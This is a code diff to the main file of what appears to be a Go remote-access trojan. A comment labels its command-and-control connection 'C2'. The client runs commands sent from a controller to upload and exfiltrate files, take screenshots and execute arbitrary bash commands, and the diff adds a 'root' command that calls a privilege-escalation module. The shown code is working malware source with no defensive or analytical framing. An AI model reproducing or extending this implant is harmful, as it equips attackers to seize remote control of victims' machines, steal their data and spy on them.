@@ -16,6 +16,7 @@ import(
   "./config"
   "./socket"
   "./screenshot"
+  "./privilege"
 )
 
 func main(){
@@ -34,7 +35,7 @@ func main(){
 
   // C2
   token, sock := connect()
-  handleCMD(token, sock)
+  handleCMD(token, sock, i)
 }
 
 func connect()(string, socket.Socket){
@@ -54,7 +55,7 @@ func connect()(string, socket.Socket){
   return token, sock
 }
 
-func handleCMD(token string, sock socket.Socket){
+func handleCMD(token string, sock socket.Socket, i *info.Info){
   for {
     cmd, err := sock.Read()
     if err == io.EOF {            // if socket break accidentally (reconnect)
@@ -76,9 +77,9 @@ func handleCMD(token string, sock socket.Socket){
       ftoken, fconn := connect()
       sock.Write(ftoken)
       if err = fconn.RecvFile(cmds[1]); err != nil {
-        sock.Write(fmt.Sprintf("%v", err))
+	sock.Write(fmt.Sprintf("%v", err))
       } else {
-        sock.Write("Finished.")
+	sock.Write("Finished.")
       }
       fconn.Close()
 
@@ -89,46 +90,59 @@ func handleCMD(token string, sock socket.Socket){
       ftoken, fconn := connect()
       sock.Write(ftoken)
       if err = fconn.SendFile(cmds[1]); err != nil {
-        sock.Write(fmt.Sprintf("%v", err))
+	sock.Write(fmt.Sprintf("%v", err))
       } else {
-        sock.Write("Finished.")
+	sock.Write("Finished.")
       }
       fconn.Close()
 
     case "screenshot":
       if fileName, err := screenshot.TakeScreenShot(); err != nil {
-        sock.Write(fmt.Sprintf("%v", err))
+	sock.Write(fmt.Sprintf("%v", err))
       } else {
-        sock.Write(fmt.Sprintln(fileName))
+	sock.Write(fmt.Sprintln(fileName))
       }
 
     case "cd":
       cmds := strings.Split(cmd, "cd")
       cmds[1] = strings.TrimSpace(cmds[1])
       if cmds[1] == "" {
-        sock.Write("Insufficient argument.")
+	sock.Write("Insufficient argument.")
       } else {
-        err = os.Chdir(cmds[1])
-        if err != nil {
-          debug.Println(err)
-          sock.Write(fmt.Sprintf("Error: %v", err))
-        } else {
-          sock.Write("Switch to " + cmds[1])
-        }
+	err = os.Chdir(cmds[1])
+	if err != nil {
+	  debug.Println(err)
+	  sock.Write(fmt.Sprintf("Error: %v", err))
+	} else {
+	  sock.Write("Switch to " + cmds[1])
+	}
       }
 
     case "shell":
       cmds := strings.Split(cmd, "shell")
       cmds[1] = strings.TrimSpace(cmds[1])
       if cmds[1] == "" {
-        sock.Write("Insufficent argument.")
+	sock.Write("Insufficent argument.")
       } else {
-        output, err := exec.Command("/bin/bash", "-c", cmds[1]).Output()
-        if err != nil {
+	output, err := exec.Command("/bin/bash", "-c", cmds[1]).CombinedOutput()
+	if err != nil {
+	  debug.Println(err)
+	  sock.Write(fmt.Sprintf("Error: %v", err))
+	} else {
+	  sock.Write(string(output))
+	}
+      }
+
+    case "root":
+      if i.GetCurUser() == "root" {
+	sock.Write("Already root.")
+      }else{
+        result, err := privilege.Get()
+        if err != nil{
           debug.Println(err)
           sock.Write(fmt.Sprintf("Error: %v", err))
         } else {
-          sock.Write(string(output))
+          sock.Write(result)
         }
       }
 
